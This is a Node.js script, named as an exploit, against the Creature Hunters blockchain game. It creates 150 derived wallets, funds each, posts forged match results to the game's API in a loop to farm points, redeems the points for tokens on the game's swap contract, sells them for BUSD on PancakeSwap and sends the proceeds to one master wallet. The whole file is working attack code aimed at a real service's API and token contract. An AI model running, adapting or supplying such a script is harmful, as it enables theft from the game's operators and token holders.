const Web3 = require('web3');
const ethers = require('ethers');
const { exec } = require('child_process');
const abiDecoder = require('abi-decoder');
const PancakeObj = require('simple-pancakeswap-sdk');

const web3_bsc = new Web3('https://bsc-dataseed1.binance.org:443');

let TOKEN_ABI = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]

let CONTRACT_ABI = [{"inputs":[{"internalType":"contract IERC20","name":"token","type":"address"},{"internalType":"address","name":"signer","type":"address"},{"internalType":"address","name":"depositAddress","type":"address"},{"internalType":"address","name":"withdrawAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"requester","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokenAmount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"SwapToPoint","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"requester","type":"address"},{"indexed":false,"internalType":"uint256","name":"pointAmount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"SwapToToken","type":"event"},{"inputs":[],"name":"_depositAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_minSwapPointAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_pointAmountPerToken","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_signer","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_token","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_withdrawAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"blockNumber","type":"uint256"},{"internalType":"uint8","name":"_v","type":"uint8"},{"internalType":"bytes32","name":"_r","type":"bytes32"},{"internalType":"bytes32","name":"_s","type":"bytes32"}],"name":"getMessage","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"depositAddress","type":"address"}],"name":"setDepositAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"minSwapPointAmount","type":"uint256"}],"name":"setMinSwapPointAmount","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"pointAmountPerToken","type":"uint256"}],"name":"setPointAmountPerToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"signer","type":"address"}],"name":"setSigner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"withdrawAddress","type":"address"}],"name":"setWithdrawAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"pointAmount","type":"uint256"},{"internalType":"uint256","name":"blockNumber","type":"uint256"},{"internalType":"uint8","name":"_v","type":"uint8"},{"internalType":"bytes32","name":"_r","type":"bytes32"},{"internalType":"bytes32","name":"_s","type":"bytes32"}],"name":"swapPointToToken","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenAmount","type":"uint256"}],"name":"swapTokenToPoint","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]

const SEED_PHRASE = 'SEED HERE'
const MainAccount = ethers.utils.HDNode.fromMnemonic(SEED_PHRASE);

const exploit = async() => {

    let main = await generateAccount(0);

    for (let i = 1; i < 150; i++) {

        await web3_bsc.eth.accounts.wallet.add(main.privateKey);

        let account = await generateAccount(i);
        
        await web3_bsc.eth.sendTransaction({
            from: main.address,
            to: account.address,
            value: web3_bsc.utils.toWei("0.003", "ether"),
            gas: "21000"
        })
        console.log(`Sending 0.003 BNB for ${account.address}`);
        
        
        console.log(`Account ${i}: ${account.address}`);
        
        console.log(`Adding the account to wallet...`)
        await web3_bsc.eth.accounts.wallet.add(account.privateKey);
        
        let signedMessage = await generateSignature(account);
        console.log(`Signing the Message: ${signedMessage}`);

        let loginResponse = await login(account.address, signedMessage);
        while(!loginResponse) {
            loginResponse = await login(account.address, signedMessage);
        }

        await makePoints(account.address, signedMessage);
        
        let callData = await generateWithdrawTokensRequest(account.address, signedMessage);
        if(callData.from == undefined) {
            continue;
        }

        console.log(`aaaaa`)
        
        while(callData.from == undefined || callData.statusCode != 500) {
            callData = await generateWithdrawTokensRequest(account.address, signedMessage);
        }
        

        
        await sendTransaction(callData, account);
        
        await web3_bsc.eth.accounts.wallet.remove(0);
        await web3_bsc.eth.accounts.wallet.add(account.privateKey);
        
        await swapTokenToBUSD(account);
        await sendBUSD(main, account);
        await recoverBNB(account, main)
        
        await web3_bsc.eth.accounts.wallet.remove(0);
        
        console.log(`=======================================`)
        
    }

}

const recoverBNB = async(spender, receiver) => {
    let balance = await web3_bsc.eth.getBalance(spender.address);

    console.log(`Account ${spender.address} has balance: ${web3_bsc.utils.fromWei(balance)}`);
        
    if(balance > 0) {
        try {
            await web3_bsc.eth.accounts.wallet.add(spender.privateKey);
            let tx = {
                from: spender.address,
                to: receiver.address,
                value: balance,
            }
        
            let gasLimit = await web3_bsc.eth.estimateGas(tx);
            let gasPrice = await web3_bsc.eth.getGasPrice();
        
            let txFee = gasLimit * gasPrice;
        
            let txBalance = (balance - txFee).toString();
                
            await web3_bsc.eth.sendTransaction({
                from: spender.address,
                to: receiver.address,
                value: txBalance,
                gas: "21000"
            })

            console.log(`Sent ${web3_bsc.utils.fromWei(txBalance)} from Account: ${spender.address} to ${receiver.address}`)
        }

        catch(e) {
            console.log(`Error in recoverBNB ${e}`);
        }
        
        
    }
}

const login = async(wallet, signature) => {
    let command = `curl -X POST "https://api-v3.creaturehunters.world/v2/user/login" -H "Content-Type: application/x-www-form-urlencoded" -H "Sign: ${signature}" -H "walletaddress: ${wallet}" --data "sign=${signature}&walletAddress=${wallet}"`

    let { stdout } = await exec(command);
    
    let response = '';

    for await (const data of stdout) {
        response += data;
    }

    let parsedResponse = {}

    try {
        parsedResponse = JSON.parse(response);

        if(parsedResponse.msg !== undefined) {
            console.log(`Logged ${wallet}: ${parsedResponse.msg}`);
            return true
        }
        else {
            console.log(`Error Login ${wallet}: ${parsedResponse.msg}`);
            return false
        }
    }
    catch(e) {
        console.log(`Error Login ${wallet}: ${parsedResponse.msg}`);
        return false
    }

}

const generateAccount = async(index) => {
    try {
        let account = MainAccount.derivePath(`m/44'/60'/0'/0/${index}`);
        return account;
    }
    catch(e) {
        console.log(`Error: ${e}`);
        return '';
    }
}


const generateSignature = async(account) => {
    let signature = await web3_bsc.eth.accounts.sign('CreatureHunters Login', account.privateKey);
    return signature.signature;
}

const makePoints = async(wallet, signature) => {

    console.log(`Making POints for ${wallet}`);

    let currentPoints = 2000;

    while(currentPoints < 15000) {
        let firstCmd = `a=$(dotnet run ${wallet} "" 2>/dev/null) && timestamp=$(echo $a | cut -d " " -f 1) && hash=$(echo $a | tail -n 1 | cut -d " " -f 2) && curl -X "POST" -H "Hash: $hash" -H "Content-Type: application/x-www-form-urlencoded" -H "Timestamp: $timestamp" -H "walletaddress: ${wallet}" -H "Sign: ${signature}" --data "characterId=999" https://api-v3.creaturehunters.world/v2/user/createVsGameHistory &`;

        let command = `a=$(dotnet run ${wallet} "" 2>/dev/null) && timestamp=$(echo $a | tail -n 1 | cut -d " " -f 1) && hash=$(echo $a | tail -n 1 | cut -d " " -f 2) && curl -X "POST" -H "Hash: $hash" -H "Content-Type: application/x-www-form-urlencoded" -H "Timestamp: $timestamp" -H "Walletaddress: ${wallet}" -H "Sign: ${signature}" --data "winLose=1&totalDamage=6666&bestDamage=6666&bestCombo=666" https://api-v3.creaturehunters.world/v2/user/vsGameReward`;

        let resp = await exec(firstCmd).stdout;
        let tmpResp = '';

        for await (const data of resp) {
            tmpResp += data;
        }

        let { stdout } = await exec(command);
    
        let responseWhile = '';

        for await (const data of stdout) {
            responseWhile += data;
        }
        
        console.log(`Debug ${responseWhile}`);

        let parsedResponseWhile = '';

        try {
            parsedResponseWhile = JSON.parse(responseWhile);
        }
        catch(e) {
            parsedResponseWhile = { totalPoint: currentPoints }
        }

        console.log(`${wallet} Points ${parsedResponseWhile.totalPoint}`);

        if (Number(parsedResponseWhile.totalPoint) !== NaN && parsedResponseWhile.totalPoint !== undefined) {
            currentPoints = parsedResponseWhile.totalPoint;
        }

        if(parsedResponseWhile.statusCode != 200) {
            console.log(`Error while Playing ${parsedResponseWhile.error}`);
            break;
        }

    }
}

const generateWithdrawTokensRequest = async(wallet, signature) => {

    let command = `a=$(dotnet run ${wallet} "" 2>/dev/null) && timestamp=$(echo $a | cut -d " " -f 1) && hash=$(echo $a | tail -n 1 | cut -d " " -f 2) && curl -X "POST" -H "Hash: $hash" -H "Content-Type: application/x-www-form-urlencoded" -H "Timestamp: $timestamp" -H "walletaddress: ${wallet}" -H "Sign: ${signature}" --data "walletAddress=${wallet}&targetAddress=0xEadbA7Cce3A69bcd04bAb097794DdF77d779694a&pointAmount=15000&method=swapPointToToken" https://api-v3.creaturehunters.world/v2/transaction/getTransactionData`;

    let { stdout } = await exec(command);
    
    let response = '';

    for await (const data of stdout) {
        response += data;
    }
    
    try {
        let parsedResponse = await JSON.parse(response);
        console.log(`Generating WithDraw Request ${response}`)

        if(parsedResponse.error !== undefined) {
            return false
        }

        else {
            return parsedResponse;
        }
    }
    catch(e){
        console.log(`Error: ${e}`);
        return false;
    }

}

const sendTransaction = async(transaction, account) => {
    abiDecoder.addABI(CONTRACT_ABI);
    

    console.log(transaction.data)
    let decodedCallData = abiDecoder.decodeMethod(transaction.data);
        
    let CHTSSwap = await new web3_bsc.eth.Contract(CONTRACT_ABI, '0xEadbA7Cce3A69bcd04bAb097794DdF77d779694a');

    let estimateGas = await CHTSSwap.methods.swapPointToToken(
        decodedCallData.params[0].value,
        decodedCallData.params[1].value,
        decodedCallData.params[2].value,
        decodedCallData.params[3].value,
        decodedCallData.params[4].value
    ).estimateGas({
        from: account.address
    })

    console.log(`Estimated Gas ${estimateGas}`);

    let response = await CHTSSwap.methods.swapPointToToken(
        decodedCallData.params[0].value,
        decodedCallData.params[1].value,
        decodedCallData.params[2].value,
        decodedCallData.params[3].value,
        decodedCallData.params[4].value
    ).send({ 
        from: account.address,
        gas: estimateGas 
    });

    console.log(`Response swapPointToToken ${response}`);

}

const sendCHTS = async(receiver, spender) => {

    let CHTS = await new web3_bsc.eth.Contract(TOKEN_ABI, '0x1cdb9b4465f4e65b93d0ad802122c7c9279975c9');
    let data = CHTS.methods.transfer(receiver.address, web3_bsc.utils.toWei("270", "ether")).encodeABI();

    let estimateGas = await CHTS.methods.transfer(receiver.address, web3_bsc.utils.toWei("270", "ether")).estimateGas({
        from: spender.address
    })

    try {
        await web3_bsc.eth.sendTransaction({
            from: spender.address,
            to: '0x1cdb9b4465f4e65b93d0ad802122c7c9279975c9',
            gas: estimateGas,
            data: data
        })

        console.log(`Send 270 CHTS!!`);
    }

    catch(e) {
        console.log(`Error: ${e}`)
    }
}

const sendBUSD = async(receiver, spender) => {
    let BUSD = await new web3_bsc.eth.Contract(TOKEN_ABI, '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56');

    let balanceBUSD = await BUSD.methods.balanceOf(spender.address).call();

    let data = BUSD.methods.transfer(receiver.address, balanceBUSD).encodeABI();

    let estimateGas = await BUSD.methods.transfer(receiver.address, balanceBUSD).estimateGas({
        from: spender.address
    })

    try {
        await web3_bsc.eth.sendTransaction({
            from: spender.address,
            to: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
            gas: estimateGas,
            data: data
        })

        console.log(`Sent ${web3_bsc.utils.fromWei(balanceBUSD)} BUSD!!`);
    }

    catch(e) {
        console.log(`Error: ${e}`)
    }
    
}

const swapTokenToBUSD = async(account) => {

    console.log(`Swaping CHTS for BUSD`);

    const pancakeswapPair = new PancakeObj.PancakeswapPair({
        fromTokenContractAddress: '0x1cdb9b4465f4e65b93d0ad802122c7c9279975c9',
        toTokenContractAddress: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
        ethereumAddress: account.address,
    });

    const pancakeswapPairFactory = await pancakeswapPair.createFactory();
    const allowanceTransaction = await pancakeswapPairFactory.generateApproveMaxAllowanceData();

    let estimateGas = await web3_bsc.eth.estimateGas(allowanceTransaction);
    console.log(estimateGas);
    
    allowanceTransaction.gas = estimateGas;

    let tr = await web3_bsc.eth.sendTransaction(allowanceTransaction);

    let swapTransaction = await (await pancakeswapPairFactory.trade('270')).transaction;
    estimateGas = await web3_bsc.eth.estimateGas(swapTransaction);

    swapTransaction.gas = estimateGas;
    try {
        let response = await await web3_bsc.eth.sendTransaction(swapTransaction);
    }
    catch(e) {
        console.log(`Error in SWAP tokens ${e}`);
        await await web3_bsc.eth.sendTransaction(swapTransaction);
    }

    await (await pancakeswapPairFactory.trade('270')).destroy()
    
}

exploit()